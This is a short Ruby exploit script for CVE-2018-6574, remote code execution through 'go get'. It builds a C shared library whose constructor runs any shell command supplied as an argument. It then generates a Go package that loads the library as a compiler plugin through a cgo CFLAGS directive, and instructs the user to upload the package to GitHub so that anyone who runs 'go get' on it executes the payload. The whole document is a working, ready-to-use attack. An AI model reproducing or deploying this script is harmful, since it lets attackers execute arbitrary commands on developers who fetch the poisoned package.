#!/usr/bin/env ruby
#
# CVE-2018-6574 | go get RCE
# KING SABRI | @KINGSABRI
#
require 'fileutils'

PLUGIN = 'plugin'.freeze       # Plugin file name
DIR    = 'go-get-rce'.freeze   # Directory cotains the full package

def plugin(payload)
  plug = <<~CCODE
    #include<stdio.h>
    #include<stdlib.h>

    static void plugon() __attribute__((constructor));
    void plugon() {
        system("#{payload}");
    }
  CCODE

  File.write("#{PLUGIN}.c", plug)
  system "gcc -shared -o #{PLUGIN}.so -fPIC #{PLUGIN}.c"
  File.delete("#{PLUGIN}.c")
end

def go
  pkg = <<~GOCODE
  package main
  /*
  #cgo CFLAGS: -fplugin=./#{PLUGIN}.so

  #include <stdio.h>
  #include <stdlib.h>

  void goputs(char* s) {
  	printf("%s\n", s);
  }
  */
  import "C"
  import "unsafe"

  func main() {
    cs := C.CString("go got rced ;)\\n")
    C.goputs(cs)
    C.free(unsafe.Pointer(cs))
  }
  GOCODE

  File.write('main.go', pkg)
end

if ARGV.size >= 1
  payload   = ARGV[0]
  FileUtils.rm_rf(DIR) if Dir.exists?(DIR)
  Dir.mkdir(DIR)
  Dir.chdir(DIR)
  plugin(payload)
  go
  puts "[1] Upload '#{DIR}' folder to github"
  puts "[2] try: go get https://github.com/[username]/#{DIR}.git"
else
  puts "ruby #{__FILE__} <PAYLOAD>"
  exit
end

